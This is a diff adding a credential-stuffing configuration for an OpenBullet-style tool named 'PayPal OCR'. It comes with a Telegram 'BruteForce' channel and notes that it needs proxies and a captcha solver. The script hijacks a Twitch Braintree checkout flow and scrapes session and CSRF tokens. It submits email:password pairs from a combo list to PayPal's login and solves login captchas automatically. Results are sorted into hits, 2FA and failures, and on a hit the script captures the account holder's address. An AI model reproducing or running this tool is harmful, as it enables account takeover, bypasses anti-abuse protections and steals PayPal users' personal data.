@@ -1,0 +1,197 @@
+[SETTINGS]
+{
+  "Name": "PayPal OCR",
+  "SuggestedBots": 50,
+  "MaxCPM": 0,
+  "LastModified": "2021-08-24T21:41:24.2812396+04:30",
+  "AdditionalInfo": "Telegram Channel: T.me/BruteForce | Needs HQ Proxy and Captcha Solver | CPM Rate: 20-100",
+  "RequiredPlugins": [],
+  "Author": "@TheOwn",
+  "Version": "1.2.2",
+  "SaveEmptyCaptures": false,
+  "ContinueOnCustom": false,
+  "SaveHitsToTextFile": false,
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": true,
+  "BanLoopEvasionOverride": -1,
+  "EncodeData": false,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "QuitOnBanRetry": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+BEGIN SCRIPT JavaScript
+function uuidv4() {
+  return 'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g, function(c) {
+    var r = Math.random() * 16 | 0, v = c == 'x' ? r : (r & 0x3 | 0x8);
+    return v.toString(16);
+  });
+}
+var gilbert = uuidv4();
+END SCRIPT -> VARS "gilbert"
+
+#P1 REQUEST POST "https://api.braintreegateway.com/merchants/vjgvc7g4y3fqps96/client_api/v1/paypal_hermes/setup_billing_agreement" AutoRedirect=FALSE 
+  CONTENT "{\"returnUrl\":\"https://checkout.paypal.com/web/3.50.0/html/paypal-redirect-frame.min.html?channel=dbe0308ec1e748beb9b346b243015dc8\",\"cancelUrl\":\"https://checkout.paypal.com/web/3.50.0/html/paypal-cancel-frame.min.html?channel=dbe0308ec1e748beb9b346b243015dc8\",\"offerPaypalCredit\":false,\"experienceProfile\":{\"brandName\":\"Twitch\",\"localeCode\":\"en_US\",\"noShipping\":\"true\",\"addressOverride\":false},\"braintreeLibraryVersion\":\"braintree/web/3.50.0\",\"_meta\":{\"merchantAppId\":\"www.twitch.tv\",\"platform\":\"web\",\"sdkVersion\":\"3.50.0\",\"source\":\"client\",\"integration\":\"custom\",\"integrationType\":\"custom\",\"sessionId\":\"<gilbert>\"},\"tokenizationKey\":\"production_syyh66jz_vjgvc7g4y3fqps96\"}" 
+  CONTENTTYPE "application/json" 
+  HEADER "Host: api.braintreegateway.com" 
+  HEADER "User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 13_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) OPT/2.3.0 Mobile/15E148" 
+  HEADER "Accept: */*" 
+  HEADER "Accept-Language: en-CA,en-US;q=0.7,en;q=0.3" 
+  HEADER "Accept-Encoding: gzip, deflate, br" 
+  HEADER "Content-Type: application/json" 
+  HEADER "Origin: https://www.twitch.tv" 
+  HEADER "Connection: keep-alive" 
+  HEADER "Referer: https://www.twitch.tv/" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Cache-Control: no-cache" 
+
+#token PARSE "<SOURCE>" LR "tokenId\":\"" "\"" -> VAR "token" 
+
+#G1 REQUEST GET "https://www.paypal.com/agreements/approve?nolegacy=1&ba_token=<token>" AutoRedirect=FALSE 
+  
+  HEADER "Host: www.paypal.com" 
+  HEADER "User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 13_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) OPT/2.3.0 Mobile/15E148" 
+  HEADER "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8" 
+  HEADER "Accept-Language: en-CA,en-US;q=0.7,en;q=0.3" 
+  HEADER "Accept-Encoding: gzip, deflate, br" 
+  HEADER "Connection: keep-alive" 
+  HEADER "Upgrade-Insecure-Requests: 1" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Cache-Control: no-cache" 
+
+#ctx PARSE "<SOURCE>" LR "name=\"ctxId\" value=\"" "\"" -> VAR "ctx" 
+
+#flowid PARSE "<SOURCE>" LR "name=\"flowId\" value=\"" "\"" -> VAR "flowid" 
+
+#sesid PARSE "<SOURCE>" LR "sessionID\" value=\"" "\"" -> VAR "sesid" 
+
+#csrf PARSE "<SOURCE>" LR "name=\"_csrf\" value=\"" "\"" -> VAR "csrf" 
+
+#csrf FUNCTION URLEncode "<csrf>" -> VAR "csrf" 
+
+#ads PARSE "<SOURCE>" LR "name=\"ads-client-context-data\" value=\"" "\"" -> VAR "ads" 
+
+#ads FUNCTION Replace "&quot;" "\"" "<ads>" -> VAR "ads" 
+
+#ads FUNCTION URLEncode "<ads>" -> VAR "ads" 
+
+#rurl PARSE "<SOURCE>" LR "requestUrl\" value=\"" "\"" -> VAR "rurl" 
+
+#rurl FUNCTION Replace "&amp;" "&" "<rurl>" -> VAR "rurl" 
+
+#rurl FUNCTION URLEncode "<rurl>" -> VAR "rurl" 
+
+#state PARSE "<SOURCE>" LR "name=\"state\" value=\"" "\"" -> VAR "state" 
+
+#state FUNCTION Replace "&amp;" "&" "<state>" -> VAR "state" 
+
+#state FUNCTION URLEncode "<state>" -> VAR "state" 
+
+#P2 REQUEST POST "https://www.paypal.com/signin?intent=checkout&ctxId=<ctx>&returnUri=/webapps/hermes&state=?flow=1-P&ulReturn=true&token=<flowid>&nolegacy=1&ba_token=<token>&locale.x=en_US&country.x=US&flowId=<flowid>" 
+  CONTENT "_csrf=<csrf>&_sessionID=<sesid>&locale.x=en_US&processSignin=main&fn_sync_data=fn_sync_data&otpMayflyKey=b4208fd62f3648ceb31f327927ce5802otpChlg&intent=checkout&ads-client-context=checkout&flowId=<flowid>&ads-client-context-data=<ads>&ctxId=<ctx>&showCountryDropDown=true&hideOtpLoginCredentials=true&requestUrl=z<rurl>&forcePhonePasswordOptIn=&returnUri=%2Fwebapps%2Fhermes&state=<state>&phoneCode=US+%2B1&login_email=<USER>&login_password=<PASS>&login_phone=&btnLogin=Login&splitLoginContext=inputPassword&isCookiedHybridEmail=true" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Host: www.paypal.com" 
+  HEADER "User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 13_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) OPT/2.3.0 Mobile/15E148" 
+  HEADER "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8" 
+  HEADER "Accept-Language: en-CA,en-US;q=0.7,en;q=0.3" 
+  HEADER "Accept-Encoding: gzip, deflate, br" 
+  HEADER "Content-Type: application/x-www-form-urlencoded" 
+  HEADER "Origin: https://www.paypal.com" 
+  HEADER "Connection: keep-alive" 
+  HEADER "Referer: https://www.paypal.com/agreements/approve?nolegacy=1&ba_token=<token>" 
+  HEADER "Upgrade-Insecure-Requests: 1" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Cache-Control: no-cache" 
+  HEADER "TE: Trailers" 
+
+KEYCHECK BanOnToCheck=FALSE 
+  KEYCHAIN Ban OR 
+    KEY "<SOURCE>" DoesNotContain "class=\"captcha-image\"><img src=\"" 
+
+#capurl PARSE "<SOURCE>" LR "class=\"captcha-image\"><img src=\"" "\"" -> VAR "capurl" 
+
+#csrf PARSE "<SOURCE>" LR "name=\"_csrf\" value=\"" "\"" -> VAR "csrf" 
+
+#csrf FUNCTION URLEncode "<csrf>" -> VAR "csrf" 
+
+#rid PARSE "<SOURCE>" LR "name=\"_requestId\" value=\"" "\"" -> VAR "rid" 
+
+#sesid PARSE "<SOURCE>" LR "name=\"_sessionID\" value=\"" "\"" -> VAR "sesid" 
+
+#hash PARSE "<SOURCE>" LR "name=\"_hash\" value=\"" "\"" -> VAR "hash" 
+
+#jsd PARSE "<SOURCE>" LR "name=\"jsd\" value=\"" "\"" -> VAR "jsd" 
+
+#captcha CAPTCHA "<capurl>" "Mozilla/5.0 (iPhone; CPU iPhone OS 13_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) OPT/2.3.0 Mobile/15E148" -> VAR "captcha" 
+
+#P3 REQUEST POST "https://www.paypal.com/auth/validatecaptcha" AutoRedirect=FALSE 
+  CONTENT "captcha=<captcha>&continue=Continue&_csrf=<csrf>&_requestId=<rid>&_hash=<hash>&_sessionID=<sesid>&jsd=<jsd>" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Host: www.paypal.com" 
+  HEADER "User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 13_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) OPT/2.3.0 Mobile/15E148" 
+  HEADER "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8" 
+  HEADER "Accept-Language: en-CA,en-US;q=0.7,en;q=0.3" 
+  HEADER "Accept-Encoding: gzip, deflate, br" 
+  HEADER "Content-Type: application/x-www-form-urlencoded" 
+  HEADER "Origin: https://www.paypal.com" 
+  HEADER "Connection: keep-alive" 
+  HEADER "Referer: https://www.paypal.com/signin?intent=checkout&ctxId=<ctx>&returnUri=%2Fwebapps%2Fhermes&state=<state>&locale.x=en_US&country.x=US&flowId=<flowid>" 
+  HEADER "Upgrade-Insecure-Requests: 1" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Cache-Control: no-cache" 
+  HEADER "TE: Trailers" 
+
+KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "Found. Redirecting to <a href=\"https://www.paypal.com/webapps/hermes?flow=1-P&amp;ulReturn=true&amp;token=EC" 
+  KEYCHAIN Retry OR 
+    KEY "CSRF token mismatch" 
+    KEY "We're sorry, we're having some trouble completing " 
+  KEYCHAIN Failure OR 
+    KEY "Some of your info didn't match" 
+    KEY "LoginFailed" 
+  KEYCHAIN Custom "EXPIRED" OR 
+    KEY "For security reasons, you’ll need" 
+  KEYCHAIN Custom "2FACTOR" OR 
+    KEY "Redirecting to <a href=\"/authflow/safe/" 
+    KEY "to <a href=\"https://www.paypal.com/authflow/twofactor" 
+    KEY "Redirecting to <a href=\"/auth/stepup" 
+
+#G2 REQUEST GET "https://www.paypal.com/myaccount/settings/" 
+  
+  HEADER "Host: www.paypal.com" 
+  HEADER "User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 13_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) OPT/2.3.0 Mobile/15E148" 
+  HEADER "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8" 
+  HEADER "Accept-Language: en-CA,en-US;q=0.7,en;q=0.3" 
+  HEADER "Accept-Encoding: gzip, deflate, br" 
+  HEADER "Content-Type: application/x-www-form-urlencoded" 
+  HEADER "Origin: https://www.paypal.com" 
+  HEADER "Connection: keep-alive" 
+  HEADER "Upgrade-Insecure-Requests: 1" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Cache-Control: no-cache" 
+  HEADER "TE: Trailers" 
+
+#a PARSE "<SOURCE>" LR "div class=\"address\"><d" "<p class=\"addresses-status" -> VAR "a" 
+
+#address PARSE "<a>" LR "iv>" "</div><div" -> VAR "address" 
+
+#loc PARSE "<a>" LR "</div><div>" "<" -> VAR "loc" 
+
+#AD FUNCTION Constant "Address: <address>, <loc>" -> CAP "Address Info" 
+
